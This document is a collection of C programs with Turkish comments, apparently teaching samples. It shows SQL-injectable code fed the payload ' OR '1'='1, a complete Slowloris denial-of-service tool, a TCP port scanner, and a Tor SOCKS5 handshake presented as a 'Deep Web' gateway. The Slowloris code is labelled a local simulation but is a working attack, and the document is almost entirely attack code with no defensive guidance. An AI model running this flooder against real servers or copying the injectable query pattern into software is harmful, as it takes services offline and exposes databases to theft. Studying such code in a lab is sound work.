Zafiyetli Kod Örneği

#include <stdio.h>
#include <string.h>

void zafiyetli_sorgu(char *kullanici_girdisi) {
    char sorgu[256];
    
    // Girdi doğrudan sorgu string'inin içine ekleniyor (Çok Tehlikeli!)
    // Kullanıcı eğer girdiye şunu yazarsa: ' OR '1'='1
    sprintf(sorgu, "SELECT * FROM kullanicilar WHERE username = '%s';", kullanici_girdisi);
    
    printf("Veritabaninda calistirilacak sorgu:\n%s\n", sorgu);
}

int main() {
    // Normal girdi yerine enjeksiyon girdisi simüle ediyoruz
    char zararli_girdi[] = "' OR '1'='1"; 
    zafiyetli_sorgu(zararli_girdi);
    return 0;
}

DDoS / Slowloris Simülasyonu (C ile Low-Level Soket)
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>

#define HEDEF_IP "192.168.1.50" // Test ettiğin yerel IP
#define HEDEF_PORT 80
#define SOKET_SAYISI 50

int main() {
    int soketler[SOKET_SAYISI];
    struct sockaddr_in sunucu_adresi;

    printf("--- Slowloris DDoS Simülasyonu Başlatılıyor ---\n");

    sunucu_adresi.sin_family = AF_INET;
    sunucu_adresi.sin_port = htons(HEDEF_PORT);
    sunucu_adresi.sin_addr.s_addr = inet_addr(HEDEF_IP);

    // Bağlantıları oluştur ve havuzu doldur
    for(int i = 0; i < SOKET_SAYISI; i++) {
        soketler[i] = socket(AF_INET, SOCK_STREAM, 0);
        if (soketler[i] < 0) {
            perror("Soket oluşturulamadı");
            continue;
        }

        if (connect(soketler[i], (struct sockaddr *)&sunucu_adresi, sizeof(sunucu_adresi)) < 0) {
            perror("Bağlantı hatası");
            close(soketler[i]);
            soketler[i] = -1;
            continue;
        }

        // Yarım kalmış HTTP başlığı gönderiyoruz (\r\n\r\n eksik bırakılıyor)
        char *header = "GET / HTTP/1.1\r\nUser-Agent: Mozilla/5.0\r\n";
        send(soketler[i], header, strlen(header), 0);
    }

    printf("%d adet soket açık tutuluyor. Sunucu meşgul ediliyor...\n", SOKET_SAYISI);

    // Bağlantıların zaman aşımına uğramaması için sürekli canlı tutma sinyali gönder
    while(1) {
        printf("Soketleri canlı tutmak için veri gönderiliyor...\n");
        for(int i = 0; i < SOKET_SAYISI; i++) {
            if (soketler[i] != -1) {
                // Rastgele anlamsız bir başlık eklemesi göndererek bağlantıyı açık tutuyoruz
                char *keep_alive = "X-a: b\r\n";
                if (send(soketler[i], keep_alive, strlen(keep_alive), 0) < 0) {
                    // Bağlantı koptuysa soketi kapat
                    close(soketler[i]);
                    soketler[i] = -1;
                }
            }
        }
        sleep(10); // 10 saniyede bir tekrarla
    }
    return 0;
}

Zafiyet Taraması (C ile Basit Port Scanner)
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>

int main() {
    int soket;
    struct sockaddr_in hedef;
    char *hedef_ip = "192.168.1.50"; // Sanal makinenin IP'si
    int portlar[] = {21, 22, 80, 443, 8080}; // Yaygın siber güvenlik portları
    int toplam_port = sizeof(portlar) / sizeof(portlar[0]);

    printf("--- %s İçin Port Tarama Başlatıldı ---\n", hedef_ip);

    hedef.sin_family = AF_INET;
    hedef.sin_addr.s_addr = inet_addr(hedef_ip);

    for(int i = 0; i < toplam_port; i++) {
        soket = socket(AF_INET, SOCK_STREAM, 0);
        hedef.sin_port = htons(portlar[i]);

        // Belirli bir süre sonra takılmaması için zaman aşımı ayarı (isteğe bağlı)
        struct timeval tv;
        tv.tv_sec = 1; // 1 saniye timeout
        tv.tv_usec = 0;
        setsockopt(soket, SOL_SOCKET, SO_RCVTIMEO, (const char*)&tv, sizeof(tv));

        // Bağlantı başarılı olursa connect 0 döner
        int sonuc = connect(soket, (struct sockaddr *)&hedef, sizeof(hedef));
        
        if(sonuc == 0) {
            printf("[+] Port %d AÇIK! (Zafiyet riski taşıyor olabilir)\n", portlar[i]);
        } else {
            printf("[-] Port %d Kapalı\n", portlar[i]);
        }
        close(soket);
    }
    return 0;
}

Deep Web Örneği (C ile SOCKS5 Proxy Üzerinden Tor Ağını Tetikleme)

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>

int main() {
    int soket;
    struct sockaddr_in tor_proxy;
    char req[4];

    printf("Tor Proxy (Deep Web Geçidi) Bağlantısı Test Ediliyor...\n");

    soket = socket(AF_INET, SOCK_STREAM, 0);
    
    // Kali Linux üzerinde arka planda çalışan varsayılan Tor servis adresi
    tor_proxy.sin_family = AF_INET;
    tor_proxy.sin_port = htons(9050); // Tor SOCKS5 Portu
    tor_proxy.sin_addr.s_addr = inet_addr("127.0.0.1");

    if (connect(soket, (struct sockaddr *)&tor_proxy, sizeof(tor_proxy)) < 0) {
        printf("[-] Hata: Tor servisi arka planda çalışmıyor olabilir! (sudo apt install tor && tor)\n");
        return 1;
    }

    // SOCKS5 Protokolü için ilk el sıkışma paketini hazırlıyoruz
    req[0] = 0x05; // SOCKS versiyon 5
    req[1] = 0x01; // 1 adet kimlik doğrulama yöntemi destekleniyor
    req[2] = 0x00; // Şifresiz/Anonim bağlantı metodu

    send(soket, req, 3, 0);

    char response[2];
    recv(soket, response, 2, 0);

    // Sunucu SOCKS5 el sıkışmasını onaylarsa 0x05 ve 0x00 döner
    if (response[0] == 0x05 && response[1] == 0x00) {
        printf("[+] Başarılı: Tor SOCKS5 tüneli kuruldu. Artık Deep Web (.onion) isteklerine hazır!\n");
    } else {
        printf("[-] Tor el sıkışması başarısız oldu.\n");
    }

    close(soket);
    return 0;
}

